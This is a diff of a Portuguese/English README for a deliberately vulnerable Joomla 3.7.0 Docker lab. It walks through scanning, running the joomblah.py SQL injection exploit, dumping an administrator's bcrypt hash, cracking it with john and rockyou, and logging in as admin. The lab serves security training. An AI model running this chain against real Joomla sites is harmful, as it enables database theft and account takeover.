@@ -1,62 +1,63 @@
 # Joomla 3.7.0 Vulnarable
-Demosntração de deploy de ambiente vulnerável para exploração da aplicação Joomla - Totalmente didático.
 
-Docker and docker compose install
+### Demosntração de deploy de ambiente vulnerável para exploração da aplicação Joomla - Totalmente didático.
+
+### Docker and docker compose install
 ```
 apt install docker.io docker-compose -y
 ```
-Start docker service
+### Start docker service
 ```
 systemctl start docker
 ```
-Download docker-compose file
+### Download docker-compose file
 ```
 wget https://raw.githubusercontent.com/thiagosmith/joomla-3.7.0/refs/heads/main/docker-compose.yml
 ```
-Download and execute docker
+### Download and execute docker
 ```
 docker-compose up
 ```
-Service identify
+### Service identify
 ```
 netstat -nltp
 ```
 ```
 nmap -sV -p8080 127.0.0.1 --script=http*
 ```
-Technology identify
+### Technology identify
 ```
 whatweb -v http://127.0.0.1:8080
 ```
-JoomScan Download
+### JoomScan Download
 ```
 git clone https://github.com/rezasp/joomscan.git
 ```
-Directory access
+### Directory access
 ```
 cd joomscan
 ```
-JoomScan execute
+### JoomScan execute
 ```
 perl joomscan.pl
 ```
-Scanning WebApp
+### Scanning WebApp
 ```
 perl joomscan.pl -u http://127.0.0.1:8080
 ```
-Download JoomBlah
+### Download JoomBlah
 ```
 https://raw.githubusercontent.com/thiagosmith/joomla-3.7.0/refs/heads/main/joomblah.py
 ```
-Execute JoomBlah
+### Execute JoomBlah
 ```
 python2 joomblah.py
 ```
-Target Exploiting
+### Target Exploiting
 ```
 python2 joomblah.py http://127.0.0.1:8080
 ```
-Website access
+### Website access
 
 http://127.0.0.1:8080/administrator/index.php
 ```
@@ -80,7 +81,7 @@ Assigned User Groups
 - Publisher 
 - Super Users 
 ```
-Target Exploiting Again
+### Target Exploiting Again
 ```
 python2 joomblah.py http://127.0.0.1:8080
 ```
@@ -88,11 +89,11 @@ Result
 ```
 Found user [u'955', u'Redscan Academy', u'redscan', u'redscan@redscan.local', u'$2y$10$YVnymbWDLku0UN5NCorT1OoA8dmMCdibIwDma2u12u5WRWgje20Ru', u'', u'']
 ```
-Hash file creating
+### Hash file creating
 ```
 nano redscan.hash
 ```
-Exibindo o conteúdo do arquivo
+### Exibindo o conteúdo do arquivo
 ```
 cat redscan.hash
 ```
@@ -100,7 +101,7 @@ Result
 ```
 $2y$10$YVnymbWDLku0UN5NCorT1OoA8dmMCdibIwDma2u12u5WRWgje20Ru
 ```
-Analyzing hash type
+### Analyzing hash type
 ```
 hashid redscan.hash
 ```
@@ -113,7 +114,7 @@ Analyzing '$2y$10$YVnymbWDLku0UN5NCorT1OoA8dmMCdibIwDma2u12u5WRWgje20Ru'
 [+] bcrypt
 --End of file 'redscan.hash'--
 ```
-Cracking hash file
+### Cracking hash file
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt redscan.hash
 ```
@@ -129,9 +130,12 @@ spongebob        (?)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
-Login in Joomla using creds cracked
+### Login in Joomla using creds cracked
+
 http://192.168.2.155:8080/administrator/index.php
+
 redscan:spongebob
+
 
 # Aviso de Isenção de Responsabilidade – Material de Red Team
 Este material destina-se exclusivamente a fins educacionais, acadêmicos e de conscientização em segurança da informação. 
